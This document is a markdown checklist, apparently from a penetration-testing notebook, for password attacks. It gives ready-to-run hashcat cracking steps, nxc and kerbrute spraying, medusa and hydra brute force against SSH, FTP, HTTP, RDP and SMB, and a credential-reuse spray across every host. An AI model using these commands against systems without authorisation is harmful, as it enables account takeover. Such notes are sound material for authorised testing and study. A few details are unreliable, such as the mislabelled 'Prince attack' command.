# 06 — Password Attacks

**Jump to:** [The rule](#the-rule) · [Hash identification (do this first every time)](#hash-identification-do-this-first-every-time) · [Cracking workflow (in order — stop when it hits)](#cracking-workflow-in-order--stop-when-it-hits) · [When cracking is too slow](#when-cracking-is-too-slow) · [Spraying (once you have a userlist)](#spraying-once-you-have-a-userlist) · [Brute (only if allowed, no lockout, and you have creds sample)](#brute-only-if-allowed-no-lockout-and-you-have-creds-sample) · [Wordlists worth remembering](#wordlists-worth-remembering) · [The "everything at once" pass (after every new cred)](#the-everything-at-once-pass-after-every-new-cred)

Trigger: any hash you can crack, or any login you can spray.
Reference: [Password Attacks](../2-pre-exploitation/03-password-attacks.md) · [Wordlist Generation](../2-pre-exploitation/04-wordlist-generation.md).

## The rule

**Windows → `nxc`. Everything else → `medusa`.** Hydra still works for HTTP forms.

## Hash identification (do this first every time)

- [ ] `hashid <hash>` — usually names the format. Rarely wrong on prefixed hashes (`$2y$`, `$argon2`).
- [ ] Cross-check against the [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) — hashid lies on ambiguous NTLM/MD4 shapes.
- [ ] Note the hashcat mode number. Common ones:

| Type | Mode |
|---|---|
| MD5 | 0 |
| SHA1 | 100 |
| SHA-256 | 1400 |
| bcrypt | 3200 |
| NTLM | 1000 |
| NetNTLMv2 | 5600 |
| Kerberos TGS-REP (Kerberoast) | 13100 |
| Kerberos AS-REP (AS-REP roast) | 18200 |
| DCC2 (cached domain) | 2100 |
| MSSQL 2012+ | 1731 |
| MySQL SHA1 | 300 |
| bcrypt (Django/WordPress) | 3200 |
| Argon2 | 34000 |
| KeePass | 13400 |
| LUKS | 14600 |
| ZIP AES | 13600 |

## Cracking workflow (in order — stop when it hits)

- [ ] **1. Rockyou straight**: `hashcat -m <mode> -a 0 hash.txt /usr/share/wordlists/rockyou.txt`.
- [ ] **2. Rockyou + best64 rules**: `hashcat -m <mode> hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`.
- [ ] **3. Rockyou + d3ad0ne / OneRuleToRuleThemAll**: bigger ruleset, slower but catches more.
- [ ] **4. Targeted wordlist** — CUPP with user's OSINT (`cupp -i`); tack on years, seasons.
- [ ] **5. Brute force with a mask** — `hashcat -m <mode> -a 3 hash.txt ?u?l?l?l?l?l?d?d` (Password12 shape).
- [ ] **6. Combinator**: `hashcat -m <mode> -a 1 hash.txt words1.txt words2.txt`.
- [ ] **7. Prince attack**: `hashcat -m <mode> hash.txt --potfile-disable rockyou.txt --stdout | ...` — good for surprise combos.
- [ ] Save every crack to `creds.txt` immediately.
- [ ] **Dump the potfile after every cracking session** to catch runs you forgot about: `cat ~/.local/share/hashcat/hashcat.potfile` → merge unique entries into `creds.txt`.

## When cracking is too slow

- [ ] Filter the wordlist to the password policy first. Waste no cycles on candidates that can't pass complexity:

  ```bash
  grep -E '^.{8,}$' rockyou.txt \
    | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > policy-safe.txt
  ```

- [ ] Split the wordlist and shard across CPU vs GPU: `hashcat --gpu-loops` / `--workload-profile 4`.
- [ ] Only use `--force` on VMs — real GPUs work without it.

## Spraying (once you have a userlist)

- [ ] Never spray without a userlist AND without checking lockout policy.
- [ ] **Sanitize the userlist first** — strip trailing whitespace (`sed -i 's/[[:space:]]*$//' users.txt`); a stray space after a name makes kerbrute/nxc silently skip it.
- [ ] **Test username == password before anything else** (any service, not just AD): `nxc smb <ip> -u users.txt -p users.txt --no-brute --continue-on-success`.
- [ ] SMB: `nxc smb hosts.txt -u users.txt -p '<Season><Year>!' --continue-on-success`.
- [ ] WinRM: same but `nxc winrm`.
- [ ] SSH: `nxc ssh hosts.txt -u users.txt -p passwords.txt --continue-on-success`.
- [ ] Kerberos pre-auth spray (no lockout): `kerbrute passwordspray -d <domain> --dc <dc> users.txt <password>`.

## Brute (only if allowed, no lockout, and you have creds sample)

- [ ] SSH: `medusa -h <ip> -U users.txt -P passwords.txt -M ssh -t 4`.
- [ ] FTP: `medusa -h <ip> -U users.txt -P passwords.txt -M ftp`.
- [ ] HTTP basic: `medusa -h <host> -U users.txt -P passwords.txt -M http`.
- [ ] HTTP form: `medusa -h <host> -U users.txt -P passwords.txt -M web-form -m FORM:"/login.php" -m DENY-SIGNAL:"Invalid"`.
- [ ] Or Hydra for tricky POST forms: `hydra -L u -P p <ip> http-post-form "/:user=^USER^&pass=^PASS^:F=Invalid"`.
- [ ] RDP: `nxc rdp <ip> -u users.txt -p passwords.txt` (medusa's RDP module is unreliable).

## Wordlists worth remembering

| List | Path | Use |
|---|---|---|
| rockyou | `/usr/share/wordlists/rockyou.txt` | Default first attempt |
| SecLists top passwords | `/usr/share/seclists/Passwords/Common-Credentials/` | Small, high-hit spray |
| SecLists xato-net top 10k | `/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt` | Big userlist |
| SecLists names | `/usr/share/seclists/Usernames/Names/` | AD username enum |
| jsmith / dominus format | (roll your own from LinkedIn OSINT) | AD userlist |

## The "everything at once" pass (after every new cred)

Any time you find a credential — even a low-priv one — spray it across every service and every host:

```bash
nxc smb   hosts.txt -u users.txt -p passwords.txt --continue-on-success
nxc winrm hosts.txt -u users.txt -p passwords.txt --continue-on-success
nxc rdp   hosts.txt -u users.txt -p passwords.txt --continue-on-success
nxc ssh   hosts.txt -u users.txt -p passwords.txt --continue-on-success
nxc ldap  hosts.txt -u users.txt -p passwords.txt --continue-on-success
nxc mssql hosts.txt -u users.txt -p passwords.txt --continue-on-success
```

`nxc` has **no** `-u creds.txt` mode — it takes a userlist and a passlist separately and tries every combination. Keep `users.txt` and `passwords.txt` as parallel files. Also run it as `-u users.txt -p users.txt --no-brute --continue-on-success` to catch accounts where username == password.
